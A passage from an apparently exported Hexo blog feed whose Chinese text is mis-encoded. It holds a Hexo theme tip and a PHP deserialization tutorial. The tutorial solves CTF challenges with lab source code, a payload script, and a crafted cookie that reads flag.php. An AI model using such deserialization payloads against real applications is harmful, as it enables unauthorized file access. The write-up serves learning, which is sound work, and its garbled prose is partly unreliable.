<p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/14077791.html">https://www.cnblogs.com/backlion/p/14077791.html</a></p>
<p><a href="https://www.yuque.com/m1tang/gqsay7/qwegln">https://www.yuque.com/m1tang/gqsay7/qwegln</a></p>
<p><a href="https://www.bilibili.com/video/BV1yX4y1V75c">https://www.bilibili.com/video/BV1yX4y1V75c</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoé¦–é¡µåªæ˜¾ç¤ºéƒ¨åˆ†æ‘˜è¦ï¼ˆä¸æ˜¾ç¤ºå…¨æ–‡ï¼‰</title>
    <url>/posts/2825537d/</url>
    <content><![CDATA[<p>åœ¨nextä¸»é¢˜d_config.ymlä¸­æ›´æ”¹è®¾ç½®(é»˜è®¤å®‰è£…æ—¶å°±æ‰“å¼€äº†)</p>
<blockquote>
<p># Automatically excerpt description in homepage as preamble text.</p>
<p>excerpt_description: true</p>
</blockquote>
<p>åœ¨æ–‡ç« çš„mdä¸­å¯ä»¥æ·»åŠ <code>description: &#39;&#39;</code>å…¶ä¸­é‡Œé¢çš„å†…å®¹å°±ä¼šæ˜¾ç¤ºåœ¨é¦–é¡µä¸Š å¦‚æœå‘è¿™æ ·å¡«å†™ï¼Œå°±ä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºä¸œè¥¿ã€‚</p>
<br>

<p>è¿™æ¬¡çªç„¶æœ‰ä¸¤ä¸ªé¡µé¢å…¨éƒ¨åŠ è½½åœ¨äº†ä¸»é¡µä¸Šï¼Œçœ‹äº†ä¸‹æ˜¯æ²¡æœ‰æ·»åŠ descriptionçš„åŸå› </p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–</title>
    <url>/posts/7c19cc12/</url>
    <content><![CDATA[<h3 id="åºåˆ—åŒ–-ä¸-ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–-ä¸-ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ– ä¸ ååºåˆ—åŒ–"></a>åºåˆ—åŒ– ä¸ ååºåˆ—åŒ–</h3><p>åºåˆ—åŒ–: æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦åºåˆ—çš„è¿‡ç¨‹<br>ååºåˆ—åŒ–: æŠŠå­—ç¬¦åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹  </p>
<p><code>serialize()</code><br><code>unserialize()</code></p>
<h3 id="phpåºåˆ—åŒ–"><a href="#phpåºåˆ—åŒ–" class="headerlink" title="phpåºåˆ—åŒ–"></a>phpåºåˆ—åŒ–</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a - array                 	b - boolean  </span><br><span class="line">d - double                 	i - integer</span><br><span class="line">o - common object         	r - reference</span><br><span class="line">s - string                 	C - custom object</span><br><span class="line">O - class                  	N - null</span><br><span class="line">R - pointer reference      	U - unicode string</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Zard&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;Dog&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;Zard&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Show_info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;name .<span class="string">&#x27; is &#x27;</span>. <span class="variable language_">$this</span>-&gt;age .<span class="string">&#x27;years old.&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;name = <span class="string">&#x27;Mamor&#x27;</span> ;</span><br><span class="line"><span class="variable">$s</span>-&gt;age = <span class="number">21</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">Show_info</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Mamor is <span class="number">21</span>years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Mamor&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">21</span>;&#125;</span><br><span class="line">User <span class="title function_ invoke__">Object</span> ( [name] =&gt; Mamor [age] =&gt; <span class="number">21</span> )</span><br></pre></td></tr></table></figure>

<p><code>a:3:&#123;i:0;s:3:&quot;Dog&quot;;i:1;s:3:&quot;Cat&quot;;i:2;s:4:&quot;Zard&quot;;&#125;</code></p>
<p><code>å¯¹è±¡ç±»å‹:é•¿åº¦:&#123;é•¿åº¦:ç±»å‹:å€¼,é•¿åº¦:ç±»å‹:å€¼,é•¿åº¦:ç±»å‹:å€¼&#125;</code></p>
<p><code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;</code></p>
<p><code>å¯¹è±¡ç±»å‹:é•¿åº¦:ç±»åï¼šç±»ä¸­å˜é‡ä¸ªæ•°:&#123;ç±»å‹ï¼šé•¿åº¦ï¼šå€¼ï¼Œç±»å‹ï¼šé•¿åº¦ï¼šå€¼ï¼Œç±»å‹ï¼šé•¿åº¦ï¼šå€¼&#125;</code><br><br></p>
<h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><p><a href="https://segmentfault.com/a/1190000007250604">PHPä¹‹åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£</a></p>
<blockquote>
<p>__construct()    å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨<br>__destruct()        å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨<br>__toString()        å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºçš„æ—¶å€™(è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™)è¢«è°ƒç”¨<br>__sleep()             åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¢«è°ƒç”¨<br>__wakeup            åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaaaa&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;bbbbb&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __construct&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __destruct()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__wakeup()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__sleep()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">// åˆ›å»ºå¯¹è±¡æ—¶ä¼šè°ƒç”¨ __construct()</span></span><br><span class="line">	<span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();  </span><br><span class="line"></span><br><span class="line">	<span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span> .<span class="variable">$serialize</span>. <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">aaa</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">__construct</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line">serialize: N;</span><br><span class="line">aaaaa</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>

<br>

<h3 id="zkaqé¶åœºé¢˜ç›®"><a href="#zkaqé¶åœºé¢˜ç›®" class="headerlink" title="zkaqé¶åœºé¢˜ç›®"></a>zkaqé¶åœºé¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag in ./flag.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class readme&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;Readme.txt&#x27;</span>, <span class="literal">true</span>).<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">readme</span>();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;  <span class="comment">//è¿™é‡Œå­˜åœ¨å¯æ§å‚æ•°ï¼Œå¯ä»¥å°è¯•æ„é€ åºåˆ—åŒ–å¯¹è±¡flag.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$todos = [];</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$c=$h+$m=md5(m)+$m</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Readme&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?source&quot;</span>&gt;&lt;h2&gt;Check Code&lt;/h2&gt;&lt;/a&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(<span class="variable">$todos</span> <span class="keyword">as</span> <span class="variable">$todo</span>):<span class="meta">?&gt;</span></span><br><span class="line">    &lt;li&gt;<span class="meta">&lt;?=</span><span class="variable">$todo</span><span class="meta">?&gt;</span>&lt;/li&gt;           <span class="comment">//  &lt;=== &lt;?php echo $todo ?&gt;çš„ç®€å†™</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> href=<span class="string">&quot;.&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;text&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;store&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class readme&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;readme.txt&#x27;</span>,<span class="literal">true</span>).<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">readme</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt;source = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = [<span class="variable">$s</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)).<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code>å…ˆè¿›è¡Œä¸€æ¬¡urlç¼–ç ç„¶åä½¿ç”¨cookieä¼ å‚</p>
<p><code>todos=e2d4f7dcc43ee1db7f69e76303d0105ca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22readme%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code>æœ€ç»ˆå¾—åˆ°<code>zkz&#123;UNs_what_what?&#125;</code></p>
<br>

<h3 id="å®‰æ´µæ¯-2019-easy-serialize-php1"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php1" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php1"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ $function = phpinfo ä¼šå¾—åˆ°phpinfoé¡µé¢ï¼Œå¾—åˆ°äº†flagæ–‡ä»¶åä¸º d0g3_f1ag.php    ï¼Œæƒ³åŠæ³•å»è¯»å–flagæ–‡ä»¶å»å¾—åˆ°flag</p>
<p>åé¢çš„wpçœ‹äº†ä¸‹å¸ˆå‚…ä»¬çš„wpï¼Œä½¿ç”¨çš„å­—ç¬¦é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$str1</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;å«æœ‰åƒåœ¾å‚æ•°çš„:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;aaaåƒåœ¾å‚æ•°w(ï¾ŸĞ”ï¾Ÿ)w&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str2</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125;</span><br><span class="line">å«æœ‰åƒåœ¾å‚æ•°çš„:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125; </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å°±ç®—æ˜¯æœ‰åƒåœ¾å‚æ•°ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¸ä¼šå‡ºç°ï¼Œä¸ä¼šå½±å“ååºåˆ—åŒ–æ­£å¸¸è¿è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br></pre></td></tr></table></figure>

<p>æ¸…ç©º$_SESSIONå˜é‡å€¼ï¼Œå¹¶é‡æ–°èµ‹å€¼</p>
<p><code>extract($_POST);</code>å¯¹postä¼ å‚è¿›è¡Œäº†å˜é‡è¦†ç›–</p>
<p>åç»­å¯ä»¥åªçœ‹è¿™äº›ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span 